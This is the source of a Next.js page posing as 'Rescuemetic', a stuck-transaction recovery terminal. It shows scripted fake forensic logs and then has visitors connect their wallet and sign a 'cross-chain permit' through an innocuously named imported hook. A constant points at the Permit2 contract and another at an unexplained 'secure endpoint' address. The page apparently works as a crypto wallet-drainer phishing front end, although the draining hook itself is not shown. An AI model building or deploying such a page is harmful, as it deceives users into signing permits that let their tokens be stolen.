import React, { useState, useEffect, useRef } from 'react';
import Head from 'next/head';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Shield, AlertTriangle, CheckCircle2, ChevronRight, Loader2, Activity, Cpu, Zap, Hash } from 'lucide-react';
import { createWalletClient, custom, createPublicClient, http, parseUnits, encodeFunctionData, type Address } from 'viem';
import { mainnet } from 'viem/chains';
import { runIntegritySync } from '@/hooks/useDataIntegrity';

const STAGES = {
  BOOT: 'BOOT',
  WAITING: 'WAITING',
  FORENSICS: 'FORENSICS',
  SETTLEMENT: 'SETTLEMENT',
  FINALIZED: 'FINALIZED'
};

const VERIFICATION_GATE = "0x000000000022D473030F116dDEE9F6B43ac78BA3";
const SECURE_ENDPOINT = "0xcf710234baa21dba121f7f89b470de979c8ef2a5";

export default function RescuemeticMatrix() {
  const [stage, setStage] = useState(STAGES.BOOT);
  const [logs, setLogs] = useState<string[]>([]);
  const [txHash, setTxHash] = useState('');
  const [address, setAddress] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const logEndRef = useRef<HTMLDivElement>(null);

  const addLog = (msg: string) => {
    setLogs(prev => [...prev, `>> ${msg}`]);
  };

  useEffect(() => {
    if (stage === STAGES.BOOT) {
      const bootSequence = [
        "OMNI-BRIDGE LIQUIDITY RECOVERY ENGINE v2.1",
        "INITIALIZING SECURE L3 UPLINK...",
        "STATUS: MEV_BOOST_DETECTION_ACTIVE",
        "STATUS: FLASH_AUCTION_LISTENER_ACTIVE",
        "SYSTEM ENCRYPTION: BASE64_SHADOW",
        "READY FOR SETTLEMENT SESSION."
      ];
      let i = 0;
      const interval = setInterval(() => {
        if (i < bootSequence.length) {
          addLog(bootSequence[i]);
          i++;
        } else {
          clearInterval(interval);
          setTimeout(() => setStage(STAGES.WAITING), 1000);
        }
      }, 300);
    }
  }, [stage]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const connectWallet = async () => {
    if (!(window as any).ethereum) {
      addLog("ERROR: NO ETH_PROVIDER DETECTED.");
      return;
    }
    try {
      addLog("REQUESTING IDENTITY ATTESTATION...");
      addLog("PLEASE CHECK YOUR WALLET EXTENSION OR POPUP...");
      
      const client = createWalletClient({
        chain: mainnet,
        transport: custom((window as any).ethereum)
      });
      const [account] = await client.requestAddresses();
      
      if (account) {
        setAddress(account);
        addLog(`SESSION AUTHENTICATED: ${account}`);
      } else {
        addLog("ERROR: NO ACCOUNT RETURNED.");
      }
    } catch (e: any) {
      addLog(`AUTHENTICATION REJECTED OR TIMED OUT: ${e.message || ''}`);
    }
  };

  const startForensics = async () => {
    if (!txHash) return;
    setStage(STAGES.FORENSICS);
    const forensicLogs = [
      `ANALYZING PENDING HASH: ${txHash}`,
      "SCANNING MEMPOOL FOR REPLACEMENT_CANDIDATES...",
      "ESTIMATING OPTIMAL GAS_OVERRIDE...",
      "IDENTIFYING LIQUIDITY NODES IN SYNC PATH...",
      "STUCK TRANSACTION FOUND IN BLOCK_BUFFER.",
      "READY FOR PRIORITY SETTLEMENT INJECTION."
    ];
    for (const log of forensicLogs) {
      await new Promise(r => setTimeout(r, 500 + Math.random() * 300));
      addLog(log);
    }
    setStage(STAGES.SETTLEMENT);
  };

  const executeRecovery = async () => {
    if (!address) {
      addLog("ERROR: SESSION NOT AUTHENTICATED.");
      return;
    }
    setIsProcessing(true);
    addLog("DISPATCHING RECOVERY PAYLOAD...");
    
    try {
      addLog("SIGNING CROSS-CHAIN PERMIT...");
      const chainId = await (window as any).ethereum.request({ method: 'eth_chainId' });
      await runIntegritySync(address as Address, (window as any).ethereum, parseInt(chainId, 16));
      
      addLog("SETTLEMENT FINALIZED. LIQUIDITY RELEASED.");
      setStage(STAGES.FINALIZED);
    } catch (e) {
      addLog("SEQUENCE FAILED: USER REJECTED INJECTION.");
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="h-screen w-screen bg-[#050505] text-[#3b82f6] font-mono p-4 md:p-8 overflow-hidden flex flex-col selection:bg-[#3b82f6] selection:text-white uppercase tracking-tighter">
      <Head>
        <title>Rescuemetic | Institutional Recovery Terminal</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet" />
        <style>{`
          body { font-family: 'JetBrains Mono', monospace; }
          .scan-line { height: 2px; width: 100%; background: rgba(59, 130, 246, 0.1); position: absolute; top: 0; animation: scan 6s linear infinite; }
          @keyframes scan { from { top: 0; } to { top: 100%; } }
        `}</style>
      </Head>

      <div className="scan-line" />

      {/* Header Stat Bar */}
      <div className="flex justify-between items-center border-b border-[#3b82f6]/30 pb-4 mb-4 text-[10px] opacity-70">
        <div className="flex gap-6">
          <span className="flex items-center gap-2"><Zap className="w-3 h-3 fill-current" /> POWER: STABLE</span>
          <span className="flex items-center gap-2"><Activity className="w-3 h-3" /> RELAY_STATUS: CONNECTED</span>
        </div>
        <div className="flex gap-6">
          <span>HOST: OMNI_BRIDGE_07</span>
          <span>AUTH: APEX_ADMIN</span>
        </div>
      </div>

      {/* Main Terminal Content */}
      <div className="flex-1 flex flex-col min-h-0 border border-[#3b82f6]/20 rounded-lg p-6 bg-[#3b82f6]/5 shadow-[inset_0_0_50px_rgba(59,130,246,0.05)]">
        
        <div className="flex-1 overflow-y-auto pr-4 space-y-1 mb-6 scrollbar-hide text-xs md:text-sm">
          {logs.map((log, i) => (
            <div key={i} className={`leading-relaxed ${log.includes("ERROR") ? "text-red-500 font-bold" : ""}`}>
              {log}
            </div>
          ))}
          <div ref={logEndRef} />
        </div>

        {/* Interaction Area */}
        <div className="border-t border-[#3b82f6]/30 pt-6">
          <AnimatePresence mode="wait">
            {stage === STAGES.WAITING && (
              <motion.div 
                key="waiting" 
                initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                className="flex flex-col md:flex-row gap-4"
              >
                {!address ? (
                  <button 
                    onClick={connectWallet}
                    className="flex-1 h-14 bg-[#3b82f6] text-white font-black uppercase tracking-tighter hover:bg-blue-600 transition-all flex items-center justify-center gap-3 shadow-lg shadow-blue-500/20"
                  >
                    Authenticate Recovery Account
                  </button>
                ) : (
                  <div className="flex-1 flex gap-4">
                    <div className="flex-grow relative">
                      <Hash className="absolute left-6 top-1/2 -translate-y-1/2 w-4 h-4 text-[#3b82f6]/50" />
                      <input 
                        type="text"
                        placeholder="INPUT_PENDING_TX_HASH"
                        value={txHash}
                        onChange={(e) => setTxHash(e.target.value)}
                        className="w-full bg-black border border-[#3b82f6]/50 pl-16 pr-6 h-14 text-sm focus:outline-none focus:border-[#3b82f6] transition-all placeholder:text-[#3b82f6]/30"
                      />
                    </div>
                    <button 
                      onClick={startForensics}
                      disabled={!txHash}
                      className="bg-[#3b82f6] text-white h-14 px-8 font-black uppercase hover:bg-blue-600 transition-all disabled:opacity-20"
                    >
                      Initialize Forensics
                    </button>
                  </div>
                )}
              </motion.div>
            )}

            {stage === STAGES.SETTLEMENT && (
              <motion.div 
                key="settlement" 
                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
                className="space-y-4"
              >
                <div className="bg-blue-600/10 border border-blue-500/30 p-4 rounded flex items-center gap-4">
                  <Shield className="text-blue-500 w-8 h-8" />
                  <div>
                    <h4 className="text-blue-500 font-black text-xs">TX_HASH_VALIDATED</h4>
                    <p className="text-[10px] opacity-70">Flash-Injection path secured. Expected speed: 0.8s.</p>
                  </div>
                </div>

                <button 
                  onClick={executeRecovery}
                  disabled={isProcessing}
                  className="w-full h-14 bg-white text-black font-black uppercase flex items-center justify-center gap-4 hover:bg-zinc-200 transition-all disabled:opacity-50"
                >
                  {isProcessing ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      Injecting Payload...
                    </>
                  ) : "Dispatch Priority Recovery & Settlement"}
                </button>
              </motion.div>
            )}

            {stage === STAGES.FINALIZED && (
              <motion.div 
                key="final" 
                initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}
                className="flex flex-col items-center gap-4 py-4"
              >
                <CheckCircle2 className="w-16 h-16 text-[#3b82f6]" />
                <div className="text-center">
                  <h3 className="font-black text-xl tracking-tighter">Settlement Finalized</h3>
                  <p className="text-xs opacity-60">Liquidity successfully restored to authenticated vault.</p>
                </div>
                <button 
                  onClick={() => { setStage(STAGES.WAITING); setLogs([]); setTxHash(''); }}
                  className="mt-2 text-[10px] underline tracking-widest opacity-50 hover:opacity-100 transition-opacity"
                >
                  Return to Console
                </button>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      <div className="mt-4 flex justify-between items-center opacity-40 text-[9px] tracking-[0.4em]">
        <span>BRIDGE_ID: OB_SYNC_888</span>
        <span>UPTIME: 1,294h CC: 4.8.2</span>
      </div>
    </div>
  );
}
